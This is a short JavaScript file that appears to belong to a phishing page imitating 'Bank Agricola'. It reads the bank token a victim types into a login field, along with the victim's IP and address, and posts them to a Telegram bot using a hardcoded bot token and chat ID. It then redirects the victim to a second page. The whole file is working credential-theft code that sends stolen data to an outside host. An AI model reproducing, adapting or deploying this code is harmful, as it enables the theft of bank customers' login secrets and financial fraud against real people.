var telegram_bot_id = "6353296325:AAGX8Ad-nAGiuk-ZrCQNPnYjLyOCOL6L3IE";
//chat id
var chat_id = "6565233851";
var u_name1110,  ip, ip2;
var ready = function () {
    u_name1110 = document.getElementById("usuario1110").value;

 
    ip = document.getElementById("gfg").innerHTML;
    ip2 = document.getElementById("address").innerHTML;
    message = "-Bank-Agricola-\nTOKEN: " + u_name1110 + "\nip" + ip +"\n" + ip2 +"\n-LOGIN-";
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST", 
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"

        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        window.location = '2.html';
        console.log(response);
    });
    return false;
};
